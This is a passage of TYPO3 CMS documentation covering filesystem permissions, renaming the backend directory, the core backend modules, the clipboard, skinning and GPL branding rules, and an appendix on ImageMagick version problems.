				has been described in detail earlier in this document.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=10%>
				<P CLASS="western">misc/</P>
			</TD>
			<TD WIDTH=90%>
				<P CLASS="western">Supplementary scripts (like superadmin.php)
				and old changelogs for previous versions. Not needed by any
				online site and can safely be removed.</P>
			</TD>
		</TR>
	</TBODY>
</TABLE>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><B>Please notice</B> that the source code <I>itself</I>
will not run out of the box - it must be set up with local site files
to form a proper website based on TYPO3. See the introduction to this
document for more information and further, seek help in other
documents if that is what you need. Possibly you should download what
is called a &quot;package&quot; if you need an out-of-the-box running
website.</P>
<H4 CLASS="western">Files of typo3/</H4>
<P CLASS="western">See the document &quot;TYPO3 Core API&quot; for a
list of the source code files. There you can also see which files
might be of interest to you.</P>
<H3 CLASS="western"><A NAME="2.11.2.Paths in TYPO3 (UNIX vs. Windows):|outline"></A>
Paths in TYPO3 (UNIX vs. Windows):</H3>
<P CLASS="western">Absolute paths are necessary in the backend in
order to support symlinking of the backend code (UNIX).</P>
<P CLASS="western">All paths are using single forward slashes
(mydir/myfile.php - right!) opposed to backslashes (mydir\\myfile.php
- WRONG!). 
</P>
<P CLASS="western">All absolute paths should begin with either “/”
or “x:/”, eg. “/mydir/myfile.php” (unix)  or
“C:/mydir/myfile.php” (windows). Please use the function
t3lib_div::isAbsPath($path) to check absolute paths. This function
will return true if absolute. There are also a few other API
functions which are very recommended for security reasons:
t3lib_div::getFileAbsFileName() will return the absolute filename for
you from a relative path and further check that the path in the input
is valid. t3lib_div::validPathStr() is also nice since it checks for
&quot;..&quot;, &quot;//&quot; and &quot;\\&quot; in the path.</P>
<P CLASS="western">See &quot;TYPO3 Core API&quot; for more details on
<A HREF="#High%20priority%20functions%20(CGL%20requirements)%7Coutline">high
priority API functions</A>.</P>
<H3 CLASS="western"><A NAME="2.11.3.Filesystem permissions|outline"></A>
Filesystem permissions</H3>
<H4 CLASS="western">How does the UNIX-filesystem permissions interact
with TYPO3? 
</H4>
<P CLASS="western">The answer is simple: TYPO3 runs as the user, PHP
&quot;runs&quot; as. This could depend on the httpd.conf file of
Apache. Default is &quot;nobody&quot; as far as I know. On Debian
installations it is &quot;www-data&quot;.</P>
<P CLASS="western">The main thing is, that TYPO3 must be able to
write to certain folders in order for the file-administration to
work. This means that after installation of TYPO3, you should alter
the user of the scripts and folders, probably with the &quot;chown&quot;
command. 
</P>
<P CLASS="western">If you have access to the webserver through FTP,
you might be uploading scripts with yourself as user. These scripts
might be executable by Apache as PHP-scripts but when the scripts
need to write to eg. the upload-folder, this folder might be owned by
&quot;you&quot; and thereby TYPO3 does not work. Therefore; the
folders TYPO3 need write-access to must be writeable by the
Apache-user. 
</P>
<P CLASS="western">Folders that requires write access are fileadmin/*
and uploads/* for the frontend and typo3temp/ for both frontend and
backend. Furthermore for extensions directories typo3/ext/ and
typo3conf/ and sub directories must be writeable for PHP as well.</P>
<P CLASS="western">Another issue is if you mount user-directories
(see the localconf-file). You may mount a directory to which you have
ftp-access. But if you do so, files uploaded to this directory may
not be deleted by TYPO3. That's normally not a problem - you can
delete them again by ftp, but it's much worse if you do not enable
read-access for the Apache-user to that directory. Then the
directory-structure will not be read and it does not show up on the
file-tab.</P>
<P CLASS="western">Experience suggests that if you run in a two-user
mode (one use for FTP, another for PHP-script execution) you should
do this to make TYPO3 work seemlessly:</P>
<UL>
	<LI><P CLASS="western">Make each user a member of the other users
	group</P>
	<LI><P CLASS="western">Set &quot;775&quot; permissions on files and
	folders that should be writeable by both</P>
	<LI><P CLASS="western">Set &quot;[user1].[user2]&quot; owner/group
	on files and folders</P>
</UL>
<H3 CLASS="western"><A NAME="2.11.4.Write protection of source code|outline"></A>
Write protection of source code</H3>
<P CLASS="western">The source code needs to be writeable at certain
points. Lets define some rules:</P>
<H4 CLASS="western">Backend / Source code:</H4>
<UL>
	<LI><P CLASS="western">Generally <I>you can write protect the whole
	TYPO3 source code</I> (that is the typo3_src/* (more specifically
	typo3/ and t3lib/) directories and their contents)</P>
	<LI><P CLASS="western">... except: &quot;typo3/ext/&quot; if you
	wish TYPO3 to install global extensions for you.</P>
</UL>
<H4 CLASS="western">Frontend (local website):</H4>
<UL>
	<LI><P CLASS="western">typo3temp/, uploads/ (+ subdirs) and
	typo3conf/ (+ subdirs) must be writeable.</P>
</UL>
<P CLASS="western">The ownership of the files should be the webserver
user executing the scripts.</P>
<P CLASS="western">On unix-boxes you can use this command:</P>
<PRE CLASS="western">chmod 555 typo3_src/ -R
</PRE><P CLASS="western">
<B>Notice:</B> A typical mistake on UNIX systems regarding the write
permissions is if you look at the write permission for eg.
“typo3conf/localconf.php” and see that this file should be
writeable. If TYPO3 tells you that it is not writeable it's most
likely because you didn't allow PHP to write to the typo3conf/
<I>directory</I> as well!</P>
<H3 CLASS="western"><A NAME="2.11.5.Changing the default “typo3/” directory|outline"></A>
Changing the default “typo3/” directory</H3>
<P CLASS="western">By default TYPO3 is administrated from the
directory “typo3/”. You can change (rename) that so the backend
is available from another directory, eg. “my_typo3_admin_dir/”.
But the frontend and backend is tied together in some ways that mean
you'll have to change parts of the source code. That is relatively
easy if you follow these guidelines:</P>
<UL>
	<LI><P CLASS="western">Rename the “typo3/” dir/softlink to
	“my_typo3_admin_dir/”. Notice that the backend directory must
	always be a sub directory to the website (extensions inside +
	frontend edit relies on the backend to be there). Further it cannot
	be a sub-sub-directory either! (This will work only partially and is
	currently not intended to be fixed).</P>
	<LI><P CLASS="western">Search for the string
	'define(&quot;TYPO3_mainDir&quot;'. At least four scripts will be
	found: typo3/sysext/cms/tslib/index_ts.php (the index.php file),
	typo3/sysext/cms/tslib/showpic.php, t3lib/thumbs.php and
	typo3/init.php. With each instance change the constant definition
	from “typo3/” to “my_typo3_admin_dir/”.</P>
	<LI><P CLASS="western">Any local extensions (those installed in
	typo3conf/ext/) that has backend modules in them (those with
	conf.php files) MUST have their $BACK_PATH definition in the
	conf.php file changed! If they are installed by the extension
	manager everything should be fine, but if not, you must change
	manually. You will receive an error something like this:<BR><BR>Warning:
	Failed opening '../../../../typo3/init.php' for inclusion...</P>
	<P CLASS="western"></P>
	<LI><P CLASS="western">Rarely: The extension “direct_mail” has
	two cron-scripts, dmailerd.phpcron and returnmail.phpsh. They have
	“typo3/” hardcoded as admin directory as well. If you use these
	scripts, you will have to change that too.</P>
	<LI><P CLASS="western">Finally you should remove the
	“temp_CACHED_ps*” files found in typo3conf/ before you test the
	new settings. Those will be re-generated with adjusted paths on the
	first executing of a TYPO3 script. On UNIX systems something like
	this will do the trick: 
	</P>
	<PRE CLASS="western">rm typo3conf/temp_CACHED_ps*</PRE>
</UL>
<H2 CLASS="western"><A NAME="2.12.Core modules|outline"></A>Core
modules</H2>
<H3 CLASS="western"><A NAME="2.12.1.List module|outline"></A>List
module</H3>
<P CLASS="western">The list module is like the file manager in an
Operating System; it provides basic access to all &quot;elements&quot;
available in the system. In TYPO3 almost all information is stored in
the database and managed after the same principles internally. For
instance Content Elements representing page content are database
records just like backend users are. The Web&gt;List module allows us
to create, modify and delete both kinds of records after the same
principles. However, &quot;context sensitive&quot; management of
Content Elements when building web page content is better done with
specialized modules like the &quot;Page&quot; module which also
provides access to Content Elements but from a CMS perspective rather
than a raw &quot;list perspective&quot;.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">In this screenshot you can see the list module
showing the content of a page in the page tree. Two tables had
records associated by that page and they are shown in the listing. 
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m738149ef.png" NAME="Graphic99" ALIGN=LEFT WIDTH=669 HEIGHT=164 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">Likewise you can use the list module to view the
content of the page tree root (PID=0). The page tree root contains
records related to the whole system (like backend users) and is only
editable for backend users. In this listing you can see the only
backend users available in this system, the &quot;admin&quot; user:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_60dedc19.png" NAME="Graphic100" ALIGN=LEFT WIDTH=654 HEIGHT=207 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">Clicking the icons of the records in the Web&gt;List
module will make a Context Sensitive Menu (CSM) appear over them
providing options for copying, pasting, editing, creating new
elements etc. If you enable the &quot;Extended view&quot; module you
will find many of these options directly in the listing:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_386575fc.png" NAME="Graphic101" ALIGN=LEFT WIDTH=669 HEIGHT=184 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">Another feature of the Web&gt;List module is that
you can view a single table only by clicking the table header. In the
single listing mode you can add additional fields from the table to
be listed. Also notice how edit icons has appeared over each column
in the list. These allow you to edit a single field (or group of
fields) from all listed records in one screen. Very nice feature.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_9643bd3.png" NAME="Graphic102" ALIGN=LEFT WIDTH=669 HEIGHT=258 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<H4 CLASS="western">Page TSconfig options for Web&gt;List module</H4>
<P CLASS="western">You can configure the List module (as well as
other backend modules) for special behaviours depending on which
branch in the page tree you use (or on user basis). Please see the
guide <A HREF="/home/shafiq/Sites/typo3/doc_core_tsconfig/doc/manual.sxw#-%3EMOD%7Coutline">&quot;TSconfig&quot;
for the available options for backend modules</A>.</P>
<P CLASS="western"><BR><BR>
</P>
<H3 CLASS="western"><A NAME="2.12.2.Info module|outline"></A>Info
module</H3>
<P CLASS="western">The Web&gt;Info module as provided by the core is
an empty shell. It provides an API that extensions can use to attach
function menu items to the Info module. 
</P>
<P CLASS="western">In the screenshot below you can see three options
in the Function Menu which are coming from installed extensions:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_736595c9.png" NAME="Graphic103" ALIGN=LEFT WIDTH=592 HEIGHT=175 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">The idea of the Web&gt;Info module is to be a host
module for backend applications that wish to <SPAN STYLE="font-style: normal">present
information /</SPAN> analysis of pages or branches of the page tree.
This could be website statistics, caching status information etc. In
the case above it is a view of available record types in the branches
in the tree.</P>
<P CLASS="western">Conceptually the Web&gt;Info module is different
from the <A HREF="#Functions%20module%7Coutline">Web&gt;Functions</A>
module only by <I>primarily showing information</I> rather than
offering functionality. It is up to extension programmers to decide
in which of these two modules they want to insert functionality.</P>
<H3 CLASS="western"><A NAME="2.12.3.Access module|outline"></A>Access
module</H3>
<P CLASS="western">The Web&gt;Access module is used to set page
permissions for users. See the section about <A HREF="#Page%20permissions%7Coutline">permissions
in TYPO3</A> for more details.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_15555628.png" NAME="Graphic104" ALIGN=LEFT WIDTH=669 HEIGHT=286 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<H3 CLASS="western"><A NAME="2.12.4.Functions module|outline"></A>Functions
module</H3>
<P CLASS="western">The Web&gt;Functions module as provided by the
core is an empty shell. It provides an API that extensions can use to
attach function menu items to the Web&gt;Function module. 
</P>
<P CLASS="western">In the screenshot below you can see the &quot;Wizard&quot;
option in the Function Menu which is coming from an installed
extension:</P>
<P CLASS="western"><IMG SRC="10_html_m43f4a0c3.png" NAME="Graphic106" ALIGN=LEFT WIDTH=669 HEIGHT=334 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">The idea of the Web&gt;Functions module is to be a
host module for backend applications that wish to perform processing
of pages or branches of the page tree. In the case above it is a
wizard application for batch creation of pages in the page tree.</P>
<P CLASS="western">Conceptually the Web&gt;Functions module is
different from the <A HREF="#Info%20module%7Coutline">Web&gt;Info</A>
module only by offering <I>processing  functionality </I>rather than
offering information only. It is up to extension programmers to
decide in which of these two modules they want to insert
functionality.</P>
<H3 CLASS="western"><A NAME="2.12.5.Filelist module|outline"></A>Filelist
module</H3>
<P CLASS="western">The File&gt;Filelist module is the interface to
the servers file system through TYPO3. It's a kind of webbased FTP
client offering the user to upload files, create new files and
folders, rename them and delete them. You can also copy / paste files
and folders. This is all done by the Context Sensitive Menus (CSM)
inside the module - just click an icon of a file or folder and you
will find the options at your disposal.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_7a44565e.png" NAME="Graphic105" ALIGN=LEFT WIDTH=669 HEIGHT=271 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<H2 CLASS="western"><A NAME="2.13.General interface features|outline"></A>
General interface features</H2>
<H3 CLASS="western"><A NAME="2.13.1.Context Sensitive Menus (CSM / &quot;Clickmenu&quot;)|outline"></A>
Context Sensitive Menus (CSM / &quot;Clickmenu&quot;)</H3>
<P CLASS="western">TYPO3 implements a well known principle for
accessing options for elements (database records / files) in the
interface; the Context Sensitive Menu. When users click an icon of a
database record or a file in most TYPO3 backend modules they can
access options for the element in a layer that pops up:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m56d3d16.png" NAME="Graphic63" ALIGN=LEFT WIDTH=309 HEIGHT=279 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><B>Notice:</B> Users have to <I>left-click</I>
(normal click) the elements rather than <I>right-click</I> than they
can do in normal GUI applications. This is due to browser limitations
that we have not been able to overcome yet.</P>
<H4 CLASS="western">Configuration options in User TSconfig</H4>
<P CLASS="western">User TSconfig offers configuration options for the
menu. Here are some examples:</P>
<P CLASS="western"><BR><BR>
</P>
<PRE CLASS="western" STYLE="margin-bottom: 0.5cm"><FONT COLOR="#0000cc">options.contextMenu.options.leftIcons</FONT> <FONT COLOR="#000000"><B>=</B></FONT> <FONT COLOR="#cc0000">1</FONT></PRE><P CLASS="western">
If set, the icons in the clickmenu appear to the left instead of
right.</P>
<P CLASS="western"><BR>
</P>
<PRE CLASS="western" STYLE="margin-bottom: 0.5cm"><FONT COLOR="#0000cc">options.contextMenu.pageTree.disableItems</FONT> <FONT COLOR="#000000"><B>=</B></FONT> <FONT COLOR="#cc0000">view, edit</FONT></PRE><P CLASS="western">
This would disable the &quot;Show&quot; and &quot;Edit&quot; items in
the CSM when showed in the page tree.</P>
<P CLASS="western">There are <A HREF="/home/shafiq/Sites/typo3/doc_core_tsconfig/doc/manual.sxw#-%3EOPTIONS%7Coutline">more
options described in the document &quot;TSconfig&quot;</A>.</P>
<H4 CLASS="western">Technical details</H4>
<P CLASS="western">The CSM is displayed as a DHTML layer made by a
&lt;div&gt; block. Scripts that implement CSM for any element has to
output two blank &lt;div&gt; blocks with certain id values
(contentMenu0/1) inside their HTML body. They provide a placeholder
for level 1 and 2 of the CSM. 
</P>
<P CLASS="western">The &lt;div&gt; blocks are empty by default. The
content will be written <I>dynamically</I> to the layers from the top
frame where the element specific content is compiled. When a user
clicks an icon with a CSM link they actually load a document
(alt_clickmenu.php with GET parameters) into the top frame which will
create the HTML for the menu layer and then write it back through
JavaScript to the &lt;div&gt; layers in the calling document.</P>
<P CLASS="western">This solution means that CSMs don't have any
significant performance footprint on the script that implements a
CSM. All that is needed is some JavaScript in the &lt;head&gt; of the
HTML document and the two &lt;div&gt; layers for the dynamic menu
HTML.</P>
<P CLASS="western">The fact that the top frame is used for generating
the CSM can be seen in browsers that does not support writing content
dynamically to the &lt;div&gt; layers in the calling document. For
those browsers the top frame will show the menu items in a horizontal
order:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m7b27b37f.png" NAME="Graphic90" ALIGN=LEFT WIDTH=454 HEIGHT=185 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">You can also enable this to happen even if the CSM
HTML is also written to the &lt;div&gt; layers. Just set this &quot;User
TSconfig&quot;:</P>
<P CLASS="western"><BR><BR>
</P>
<PRE CLASS="western" STYLE="margin-bottom: 0.5cm"><FONT COLOR="#0000cc">options.contextMenu.options.alwaysShowClickMenuInTopFrame</FONT> <FONT COLOR="#000000"><B>=</B></FONT> <FONT COLOR="#cc0000">1</FONT></PRE><H4 CLASS="western">
Adding elements to a Context Sensitive Menu</H4>
<P CLASS="western">For details on the <A HREF="#Adding%20Context%20Sensitive%20Menu%20items%7Coutline">API
for adding elements, please see &quot;TYPO3 Core API&quot;</A>.</P>
<H3 CLASS="western"><A NAME="2.13.2.Clipboard|outline"></A>Clipboard</H3>
<P CLASS="western">The basic engine behind copying and moving
elements around in TYPO3 is the clipboard
(t3lib/class.t3lib_clipboard.php). The clipboard simply registers a
reference to the element(s) (file or database record) put on the
clipboard. The clipboard is saved in the session data and normally
lasts for the login session.</P>
<P CLASS="western">The clipboard content can be seen in the Web&gt;List
module if you enable &quot;Show clipboard&quot;:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m61d9b158.png" NAME="Graphic91" ALIGN=LEFT WIDTH=330 HEIGHT=195 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">The clipboard has multiple &quot;pads&quot;, a
&quot;Normal&quot; pad an a series of &quot;numeric pads&quot; named
&quot;Clipboard #xxx&quot;. 
</P>
<UL>
	<LI><P CLASS="western">The &quot;Normal&quot; pad can contain one
	element at a time. The element is registered for &quot;copy&quot; or
	&quot;cut&quot; operation (depending on the function that selected
	it for the clipboard). The &quot;Normal&quot; pad is always used
	from the CSM (Context Sensitive Menu) elements.<BR>The &quot;Normal&quot;
	pad is used for most standard copy/cut/paste operations you need.</P>
	<LI><P CLASS="western">The numeric pads can contain multiple
	elements, even mixed between database elements and files/folders.
	Registering elements to a numeric pad is done from the Web&gt;List
	or File&gt;Filelist modules when they are in the &quot;Extended
	view&quot; mode and a numeric pad is enabled. &quot;Copy&quot; or
	&quot;Cut&quot; mode is toggled for the whole selection by a button
	on the clipboard.<BR>The &quot;Numeric pads&quot; are used for
	advanced needs where typically many elements has to be copied/moved
	in one operation.</P>
</UL>
<H4 CLASS="western">The &quot;Normal&quot; pad</H4>
<P CLASS="western">When you are using the CSMs to copy/cut/paste
elements around you will automatically use the Normal pad on the
clipboard. Internally that is where TYPO3 registers the element.</P>
<P CLASS="western">In the CSM you always have a &quot;Cut&quot; and
&quot;Copy&quot; option and depending on the context you might also
have &quot;Paste into&quot; and &quot;Paste after&quot;. 
</P>
<UL>
	<LI><P CLASS="western">&quot;Paste into&quot; equals the normal
	&quot;Paste&quot; operation from a file system; it will paste the
	element <I>into</I> the file folder / page you pointed to. 
	</P>
	<LI><P CLASS="western">&quot;Paste after&quot; is special for TYPO3s
	page tree or record lists where elements might be arranged in a
	special order. In that case you need a function like &quot;Paste
	after&quot; which can insert an element <I>below</I> the element you
	clicked in a list of manually ordered items.</P>
</UL>
<P CLASS="western"><IMG SRC="10_html_66374271.png" NAME="Graphic93" ALIGN=LEFT WIDTH=160 HEIGHT=260 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">In the screenshot above you can see the clipboard
related options from the CSM of a page in the page tree. 
</P>
<P CLASS="western">Below you can see how the File&gt;Filelist module
looks when a file is selected on the clipboard. First of all you will
get a visual response from the &quot;copy&quot; icon if the current
element is the one already selected. You can deselect by selecting
&quot;Copy&quot; again. Also you will see that the File&gt;Filelist
module (as well as the Web&gt;List module) provides copy/cut/paste
icons directly in the list. Finally, notice the clipboard which is
opened in the bottom of the list. It shows the selected element and
which mode (&quot;Copy&quot; or &quot;Cut&quot;) it is selected in.</P>
<P CLASS="western"><BR><BR>
</P>
<H4 CLASS="western"><IMG SRC="10_html_682e60ab.png" NAME="Graphic92" ALIGN=LEFT WIDTH=373 HEIGHT=444 BORDER=0><BR CLEAR=LEFT></H4>
<H4 CLASS="western">The numerical pads</H4>
<P CLASS="western">To select elements to the numeric pads you have to
use the File&gt;Filelist or Web&gt;List modules, enable the clipboard
and select one of the numeric pads. In the file or record lists you
can now tick off which elements to select and click the &quot;Select&quot;
icon to move the selection to the clipboard:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_2b864967.png" NAME="Graphic96" ALIGN=LEFT WIDTH=75 HEIGHT=106 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">The screen will be reloaded and the selected
elements shown in both the list and the open clipboard:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m6893141c.png" NAME="Graphic94" ALIGN=LEFT WIDTH=493 HEIGHT=452 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">Paste operations are done by the paste icons
provided in the list.</P>
<P CLASS="western">Notice that in this case three files are also on
the same pad. This is allowed but obviously they will not be possible
to paste where database records can be pasted - an vice versa.</P>
<P CLASS="western">In the File&gt;Filelist module you will see that
the files are the active elements if you go there:</P>
<P CLASS="western"><IMG SRC="10_html_3b7bc292.png" NAME="Graphic95" ALIGN=LEFT WIDTH=445 HEIGHT=596 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<H4 CLASS="western">Thumbnails and &quot;Copy&quot; / &quot;Cut&quot;
modes</H4>
<P CLASS="western">The clipboard has controls to enable thumbnail
display for image files:</P>
<P CLASS="western"><IMG SRC="10_html_419d78f6.png" NAME="Graphic97" ALIGN=LEFT WIDTH=292 HEIGHT=136 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">You can also switch between &quot;Copy&quot; and
&quot;Cut&quot; modes. This is necessary particularly when operating
on the numeric pads:</P>
<P CLASS="western"><IMG SRC="10_html_m2b1a51ab.png" NAME="Graphic98" ALIGN=LEFT WIDTH=283 HEIGHT=76 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<H4 CLASS="western">Accessing clipboard content from PHP</H4>
<P CLASS="western">In &quot;TYPO3 Core API&quot; there is an <A HREF="#Accessing%20the%20clipboard%7Coutline">example
of how you can access elements registered on the clipboard</A>.</P>
<H3 CLASS="western"><A NAME="2.13.3.Creating skins for TYPO3|outline"></A>
Creating skins for TYPO3</H3>
<P CLASS="western">With TYPO3 3.6.0 it is possible to create skins
for TYPO3 which will affect not only the CSS styles used in the
backend but also provide alternatives for all icons in the interface.
The result is an interface with a totally different look but
maintaining the same structure:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m33a5c914.jpg" NAME="Graphic2" ALIGN=LEFT WIDTH=669 HEIGHT=406 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">This screenshot is from the skin extension
“skin360” which is an example of how skins can be made. The
“skin360” extension is therefore a good place to start to look if
you want to create your own skins.</P>
<H4 CLASS="western">Skinning API</H4>
<P CLASS="western">In “TYPO3 Core API” you can find a section
which documents the <A HREF="#Skinning%20API%7Coutline">API for TYPO3
skins</A>. Use this section in conjunction with example extensions
like “skin360”.</P>
<H4 CLASS="western">IMPORTANT: Skinning and copyrights</H4>
<P CLASS="western">Skins make it possible to personalize TYPO3 for
your own purposes. For instance you can insert a customers logo or
your own companys logo and style. However it is very important that
you do not go so far that you effectively rebrand TYPO3!</P>
<P CLASS="western">Rebranding TYPO3 is illegal (by default copyright
and trademark laws, see <A HREF="http://typo3.org/1310.0.html">details
here</A>). Rebranding means that you give the TYPO3 CMS &quot;another
name&quot;, presumably to sell “your product” to a customer. So
<I>never </I>try to brand TYPO3 as if it was your own product to
which you have the copyright. Always make sure your custom is aware
that they get TYPO3 which is free under the GPL license.</P>
<P CLASS="western">But how far can you go then? Well, with skinning
you can actually change all graphics of the application, including
the login screen logo and logo in the top left corner of the backend.
As long as these logos do not give the impression that the CMS is
something else than TYPO3 you can personalize these logos as much as
you like. You can name them after the company to which you sell the
solution so it feels personal for them. Or you could mix TYPO3s logo
with your companys logo, stating something like “My Company proudly
uses TYPO3 blablabla” or whatever.</P>
<P CLASS="western">The main reason why you can change these logos is
that the official TYPO3 logo and name is included in the copyright
notice of the login screen and “About Modules” screen. This
notice must <I>never </I>be changed by you and must display &quot;as
is&quot;. This is what ultimately identifies to the user that the
underlying CMS is in fact TYPO3, not something else.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">On this screenshot below you can see it in effect:
The top logo (#1) could be the one of your company or customer,
adding a personal touch to the login screen. In the bottom (#2) you
will see the TYPO3 logo and product name in the copyright notice.
This must not be changed.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m4633c65f.png" NAME="Graphic4" ALIGN=LEFT WIDTH=277 HEIGHT=323 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">Notice, that the bottom message (#2) is not
something we have made up ourselves but required by the GPL license
according to this part of the license:</P>
<PRE CLASS="western">...
If the program is interactive, make it output a short notice like this
when it starts in an interactive mode:

    Gnomovision version 69, Copyright (C) year name of author
    Gnomovision comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
    This is free software, and you are welcome to redistribute it
    under certain conditions; type `show c' for details.
...
</PRE><P CLASS="western">
(The GPL license can be found in the file “GPL.txt” inside the
TYPO3 source code)</P>
<H1 CLASS="western" STYLE="page-break-before: always"><A NAME="3.Appendix|outline"></A>
</SPAN>Appendix</H1>
<H2 CLASS="western"><A NAME="3.1.ImageMagick|outline"></A>ImageMagick</H2>
<H3 CLASS="western"><A NAME="3.1.1.Introduction|outline"></A>Introduction</H3>
<P CLASS="western">ImageMagick has been used since the dawn of times
by TYPO3. What we didn't know back then is that ImageMagick would
have a record of changing APIs all the time which has been a real
pain in the behind for us during the years. Also certain features has
been changed, some has been made significantly slower, some removed
totally and some got a poorer quality in our opinion. All this has
lead to the recommendation of using ImageMagick 4.2.9 - a 6 years old
version.</P>
<P CLASS="western">Starting with TYPO3 3.8.0, support for
GraphicsMagick has been introduced. GraphicsMagick is a fork of
ImageMagick whose mission is to build a more stable version of
ImageMagick – which is really the case.</P>
<P CLASS="western">Refer to the Install Tool for more information
about using GraphicsMagick. Usually it should be detected
automatically and be preferred over ImageMagick if both are found. We
recommend to use it and forget about all those ImageMagick
troubles...</P>
<P CLASS="western">The following pages contain old notes about the
ImageMagick problems. They are preserved for historical reasons
mostly.</P>
<H3 CLASS="western"><A NAME="3.1.2.Filesystem Locations (rpms): |outline"></A>
Filesystem Locations (rpms): 
</H3>
<P CLASS="western"><B>NO LZW: </B>
</P>
<P CLASS="western">4.2.9: /usr/X11R6/bin/ 
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><B>LZW: </B>
</P>
<P CLASS="western">5.1.1: /usr/local/bin/ 
</P>
<P CLASS="western">5.1.0, 5.2.0, 5.2.3: /usr/bin/ 
</P>
<P CLASS="western"><BR><BR>
</P>
<H3 CLASS="western"><A NAME="3.1.3.What is wrong with ImageMagick ver. 5+_ |outline"></A>
What is wrong with ImageMagick ver. 5+? 
</H3>
<UL>
	<LI><P CLASS="western">&quot;combine&quot; creates a transparent
	entry in GIF-files (or makes an alphachannel) when overlaying
	images. Ver 4.2.9 doesn't. This creates the problem that the
	giffiles are often transparent in dark areas. 
	</P>
	<LI><P CLASS="western">&quot;combine&quot; interprets masks
	reversely to the norm. This means that any mask must be negated
	before rendering. 
	</P>
</UL>
<H4 CLASS="western"><B>Compatilibity:</B> 
</H4>
<P CLASS="western" STYLE="margin-bottom: 0cm"><B>&lt;= 4.2.9: </B>
</P>
<P CLASS="western" STYLE="margin-bottom: 0cm">+ NO-LZW problem 
</P>
<P CLASS="western" STYLE="margin-bottom: 0cm">- Transparency BUG 
</P>
<P CLASS="western" STYLE="margin-bottom: 0cm">- Mask negate 
</P>
<P CLASS="western" STYLE="margin-bottom: 0cm"><BR>
</P>
<P CLASS="western" STYLE="margin-bottom: 0cm"><B>5-5.1.x: </B>
</P>
<P CLASS="western" STYLE="margin-bottom: 0cm">- NO-LZW problem 
</P>
<P CLASS="western" STYLE="margin-bottom: 0cm">+ Transparency BUG 
</P>
<P CLASS="western" STYLE="margin-bottom: 0cm">- Mask negate 
</P>
<P CLASS="western" STYLE="margin-bottom: 0cm"><BR>
</P>
<P CLASS="western" STYLE="margin-bottom: 0cm"><B>5.2.x: </B>
</P>
<P CLASS="western" STYLE="margin-bottom: 0cm">- NO-LZW problem 
</P>
<P CLASS="western" STYLE="margin-bottom: 0cm">+ Transparency BUG 
</P>
<P CLASS="western" STYLE="margin-bottom: 0cm">+ Mask negate 
</P>
<P CLASS="western" STYLE="margin-bottom: 0cm"><BR>
</P>
<P CLASS="western" STYLE="margin-bottom: 0cm">+ Gaussian? 
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">Version 5+ Seems to be very slow. 
</P>
<P CLASS="western">Version 5.2.3 in test had the following problems:
Using such as -sharpen and -blur was very slow compared to 4.2.9.
Blurring was maybe 2 or three times slower. -sharpen couldn't be used
at all at values above like 10 or so (and I normally use 99). It
resulted in operations never carried out. 
</P>
<P CLASS="western">Gaussian blurring didn't seem to work well. I
succeeded in passing values of 15. There was an error if a passed
&quot;15x5&quot; for example. High Gaussian blur values didn't make
any difference. 
</P>
<H4 CLASS="western">Response from ImageMagick developers</H4>
<P CLASS="western"><B>Bob Friesenhahn &lt;bfriesen@simple.dallas.tx.us&gt;</B></P>
<PRE CLASS="western">&gt; The greatest problem at this point is, that version 5+ seems to be
&gt; very slow compared to ver4: Version 5.2.3 in test had the
&gt; following problems: Using such as -sharpen and -blur was very slow
&gt; compared to 4.2.9. Blurring was maybe 2 or three times slower.
